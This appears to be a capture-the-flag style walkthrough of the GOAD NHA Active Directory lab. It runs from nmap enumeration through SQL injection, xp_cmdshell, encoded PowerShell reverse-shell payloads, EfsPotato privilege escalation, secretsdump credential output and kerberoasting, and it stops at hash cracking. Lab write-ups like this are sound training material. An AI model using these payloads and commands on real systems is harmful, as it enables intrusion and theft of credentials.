---
layout: default
title : nighthawk - GOAD - NHA Ninja Hacking Academy (NHA)
---

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/731a0bed-774d-4103-a4c8-b41d30fc78c5" />

### Description
This lab is written as a training challenge where GOAD was written as a lab with a maximum of vulns. We will look on how to exploit many vulnerabilities as possible to get DA on both domains, 6 flags (web, sql_low, sql_high, share, dc_academy, dc_final).
<br></br>

### Enumeration
<br>

- First get list of ip

```
192.168.56.10
192.168.56.20
192.168.56.21 <--- (STARTING POINT)
192.168.56.22
192.168.56.23
```
<br></br>

#### 192.168.56.21 (Entry Point)

- Enumerating machines with nmap

```shell
# Nmap 7.95 scan initiated Thu Aug 20 06:46:26 2026 as: /usr/lib/nmap/nmap --privileged -F -sCV -oN GOADNHA.21_fastscan.txt -v -Pn 192.168.56.21
Nmap scan report for web.academy.ninja.lan (192.168.56.21)
Host is up (0.00035s latency).
Not shown: 96 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Home Page - NHA - Ninja Hacker Academy
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 4859E39AE6C0F1F428F2126A6BB32BD9
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ACADEMY
|   NetBIOS_Domain_Name: ACADEMY
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: academy.ninja.lan
|   DNS_Computer_Name: web.academy.ninja.lan
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-20T05:39:44+00:00
| ssl-cert: Subject: commonName=web.academy.ninja.lan
| Issuer: commonName=web.academy.ninja.lan
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-18T21:08:18
| Not valid after:  2027-02-17T21:08:18
| MD5:   a27d:4630:6cdc:748b:7ff3:4011:52b7:805c
|_SHA-1: 308f:964a:4583:7c45:f28b:0ad6:faaa:e873:212b:c0b8
|_ssl-date: 2026-08-20T05:40:29+00:00; -6m45s from scanner time.
MAC Address: 08:00:27:1B:9D:25 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-20T05:39:45
|_  start_date: N/A
|_clock-skew: mean: -6m48s, deviation: 2s, median: -6m50s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 06:47:14 2026 -- 1 IP address (1 host up) scanned in 48.13 seconds
```
we have http open on port 80, let's check out what's going on 
<br></br>

<img width="1411" height="924" alt="image" src="https://github.com/user-attachments/assets/a13dd6d3-f2c4-49f5-9f5a-a840fede8463" />

cool we got a Ninja Hacking Academy home page. 
<br></br>

<img width="1385" height="763" alt="image" src="https://github.com/user-attachments/assets/509cc5be-16a7-4f86-8787-a63959d7c5f7" />
checking around the web application, found list of students.

<img width="1808" height="517" alt="image" src="https://github.com/user-attachments/assets/ce631179-c074-4f46-8385-407b92ab12d6" />

searching by firstname, `s`. we got a juicy url which is a potential ground to test for sql injection
<br></br>

- Testing for sql injection

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]                                                                      
└─$ ghauri -u 'http://192.168.56.21/Students?SearchString=s&orderBy=Firstname' --dbs 
```

<img width="1087" height="620" alt="image" src="https://github.com/user-attachments/assets/d3960ea7-922d-4091-b8c6-147b0f336596" />

using an offsec tool `ghauri`  we can see the database available. which proves there's sql injection vulnerability present.
<br></br>


- Manually testing for SQL injecction

<img width="1924" height="1033" alt="image" src="https://github.com/user-attachments/assets/72e6d391-6a07-4ccc-8fe8-75e46b82d3d9" />

using payload `WAITFOR DELAY '00:00:10'--+-` on url `http://192.168.56.21/Students?SearchString=s&orderBy=Firstname%20WAITFOR%20DELAY%20%2700:00:10%27--+-` we delayed the web app for 10 secs. let's do 15 secs. 

<img width="1911" height="936" alt="image" src="https://github.com/user-attachments/assets/d7291642-1682-4b96-a69b-4014a76ba16c" />

We got the web app to delay loading for 15 secs. Now the juicy part, Poping Shell. 
<br></br>


#### Getting reverse shell into 192.168.56.21

> Injection payload to exec RCE

```sql
;EXEC%20sp_configure%20'show%20advanced%20options',%201;%20RECONFIGURE;--
;EXEC%20sp_configure%20'xp_cmdshell',%201;%20RECONFIGURE;--
;EXEC%20xp_cmdshell%20'ping%20192.168.56.1';--
```
send all the payloads 1 by 1 fire up tcpdump listener on your attacker ip 

<img width="951" height="264" alt="image" src="https://github.com/user-attachments/assets/ee943332-3d00-4810-b508-8adc5fb83d17" />

this confirmed we can execute commands and also interact with our attacker machine. now the juicy shelling part. 

- Fire up Ncat listener

<img width="550" height="164" alt="image" src="https://github.com/user-attachments/assets/690e1513-5f4a-405c-a502-2c3964169307" />

> Reverse shell payload 

```
;EXEC%20xp_cmdshell%20'powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADEAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D';--
```

- send the payload 

<img width="1908" height="927" alt="image" src="https://github.com/user-attachments/assets/58381ce8-5a48-49bc-a6f0-eec667c9132d" />

- check listener

<img width="640" height="180" alt="image" src="https://github.com/user-attachments/assets/2548d04a-34b0-44f6-b947-44eeb08b0460" />

Our listener didn't catch shell. maybe there's a defense. 

- Let's look for another way 😹

```
;EXEC%20xp_cmdshell%20%27powershell%20-nop%20-w%20hidden%20-enc%20JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAnACwANAA0ADMAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAgADAAKQB7ADsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJAByAD0AaQBlAHgAIAAkAGQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwA7ACQAcgA9ACQAcgArACcAUABTAD4AIAAnADsAJABzAGIAYgA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJAByACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgBiACwAMAAsACQAcwBiAGIALgBMAGUAbgBnAHQAaAApAH0AOwAkAGMALgBDAGwAbwBzAGUAKAApAA%3D%3D%27%3B--
```

<img width="3456" height="516" alt="image" src="https://github.com/user-attachments/assets/fadab247-5e6b-4cec-a755-4b69840bcaf0" />

Boom we got reverse shell as `nt authority\network service` but into 192.168.56.22 (SQL)
<br></br>

#### Privilege Escalation 

<img width="924" height="961" alt="image" src="https://github.com/user-attachments/assets/fe780ebe-811c-4ed5-9d47-34b7b63c9093" />

we found mssql admin password. 
<br></br>

- try out the cred

<img width="1443" height="136" alt="image" src="https://github.com/user-attachments/assets/19d13e94-3a2b-4cd6-964f-29ca0ea74e90" />

we have admin access on mssql 
<br></br>

- Connect the target machine to our smb server

<img width="779" height="128" alt="image" src="https://github.com/user-attachments/assets/ea1b645d-c414-4f3e-9bfa-ce04316554e8" />

host smbserver

<img width="1521" height="198" alt="image" src="https://github.com/user-attachments/assets/0b397106-0944-4c33-86b2-b89ffaf5e317" />

authenticated successfully with our smb server. 

<img width="1618" height="311" alt="image" src="https://github.com/user-attachments/assets/9a479960-6078-41b7-9258-6eebfd727ec0" />

we have privilege `SeImpersonate` enabled. there's heavy AV guard present. 

- Flag

<img width="654" height="437" alt="image" src="https://github.com/user-attachments/assets/939db9a9-88ff-4b72-a80e-3363791c1bd9" />

we got our flag on .22. 
<br></br>


- Escalating privilege using EfsPotato

<img width="1542" height="292" alt="image" src="https://github.com/user-attachments/assets/fd439e8e-e647-4825-b09e-cddeacc33012" />

trust me this took 16 hours to evade, it flagged the binary now, i had to turn off the Defender to execute this. 😭 the lab Defense is hell. I changed the administrator password.
<br></br>

- Getting root flag on .22

<img width="1356" height="414" alt="image" src="https://github.com/user-attachments/assets/75f13a14-0830-424d-84e5-97d647d2b169" />

we got the flag.
<br></br>




#### Post Exploitation 

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
└─$ impacket-secretsdump Administrator@192.168.56.22
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe27efa9d2e2a45b42cfb6da61636180c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6d587fe93bb333e51b07759bc056d261:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
nighthawk:1002:aad3b435b51404eeaad3b435b51404ee:9cd837f340f7b1768b2b7c97274c2eb6:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ACADEMY\SQL$:aes256-cts-hmac-sha1-96:7016df08aa72ceb3665832f500692d01fcc6b399b91e93ff5b98e710aeab8372
ACADEMY\SQL$:aes128-cts-hmac-sha1-96:ed902032e6ae4970d850acb8b39fa571
ACADEMY\SQL$:des-cbc-md5:e9c1321a1a19f2f8
ACADEMY\SQL$:plain_password_hex:580071004500700044005a002e0034006e0068003500200021004d003400770076002d006700370077003500620042003a006b006e005e006a00410040003f0077004000460069005d004f005100780052002b006e002f005400250058002b007a0037006f002c0032005d003d0036002900420049002000540031003c002400270040003e0024004a0034003b007900400030002a00530070002900410058002200200079007100610056006c004a0051003d00680072003b0039004a007000680078004a007400590074002400300049003f0063002900350068004800730022002a00570035007000460068002c00
ACADEMY\SQL$:aad3b435b51404eeaad3b435b51404ee:b0bf9268ebc9c75d9c13f25f5a33e751:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x8abc51c852f35b14a68334ff3539e1524242be26
dpapi_userkey:0xdfd50720f5aff1df52feb1fac43dd78ad9dcf0fe
[*] NL$KM 
 0000   6A 2F A7 33 55 6E B4 2D  26 EA 27 3B 9B C0 A2 5C   j/.3Un.-&.';...\
 0010   D6 5C CC CC 8C 6A 7B 82  D1 83 BC 0B 4F 1A 89 42   .\...j{.....O..B
 0020   66 4F 98 75 84 97 FF AE  F4 C4 7A 60 0D 6A 41 DA   fO.u......z`.jA.
 0030   75 B3 F0 BD 65 28 BD 52  06 8C 06 AA DB BB A1 9A   u...e(.R........
NL$KM:6a2fa733556eb42d26ea273b9bc0a25cd65ccccc8c6a7b82d183bc0b4f1a8942664f98758497ffaef4c47a600d6a41da75b3f0bd6528bd52068c06aadbbba19a
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```
we dumped domain credentials. 
<br></br>

- Using users cred `SQL$`

<img width="1583" height="238" alt="image" src="https://github.com/user-attachments/assets/0011b665-c916-4e21-948d-374b530daced" />

we have access to every other machines except the other DC 
<br></br>

- Keberoasting with the credential

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
└─$ impacket-GetUserSPNs -dc-ip 192.168.56.20 -outputfile hashes.asreproast academy.ninja.lan/'SQL$' -hashes :b0bf9268ebc9c75d9c13f25f5a33e751 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                 Name     MemberOf                                        PasswordLastSet             LastLogon                   Delegation  
-----------------------------------  -------  ----------------------------------------------  --------------------------  --------------------------  -----------
eventlog/share.academy.ninja.lan     frank    CN=Teacher,CN=Users,DC=academy,DC=ninja,DC=lan  2026-08-19 22:13:12.900960  2026-08-20 20:06:11.137606  constrained 
HTTP/WEB.academy.ninja.lan           frank    CN=Teacher,CN=Users,DC=academy,DC=ninja,DC=lan  2026-08-19 22:13:12.900960  2026-08-20 20:06:11.137606  constrained 
MSSQLSvc/sql.academy.ninja.lan       sql_svc                                                  2026-08-19 22:13:17.400843  <never>                                 
MSSQLSvc/sql.academy.ninja.lan:1433  sql_svc                                                  2026-08-19 22:13:17.400843  <never>                                 



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
we have an error, clock skew too great. 

<img width="1917" height="689" alt="image" src="https://github.com/user-attachments/assets/fcdf6163-f826-4219-bc7a-4f113a082bc9" />

fixed it, we got users tgs hashes. 

> command

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
└─$ nxc ldap ips.txt -u 'SQL$' -H b0bf9268ebc9c75d9c13f25f5a33e751 --kerberoasting hashes.asreproast
```
<br></br>

- Cracking these hashes




















